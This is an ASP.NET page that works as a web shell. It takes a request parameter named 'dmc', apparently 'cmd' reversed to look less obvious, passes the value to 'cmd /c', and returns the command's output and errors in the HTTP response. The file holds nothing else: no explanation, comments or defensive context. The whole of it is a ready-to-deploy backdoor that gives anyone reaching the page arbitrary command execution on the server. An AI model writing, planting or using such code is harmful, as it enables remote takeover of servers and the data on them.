<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
string outthis = "";
string derr = "";
string dmc = "";
string xod = "";

void Page_Load(object sender, System.EventArgs e) {
	dmc = Request["dmc"];

	if (dmc!= null) {
		dmc= Server.UrlDecode(dmc);

		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + dmc);
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.RedirectStandardError = true;
		procStartInfo.UseShellExecute = false;
		procStartInfo.CreateNoWindow = true;
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		outthis = p.StandardOutput.ReadToEnd();
		derr = p.StandardError.ReadToEnd();
		Response.Write("out<pre>" + outthis);
		Response.Write("<br>err" + derr + "</pre>");
	}
}
</script>
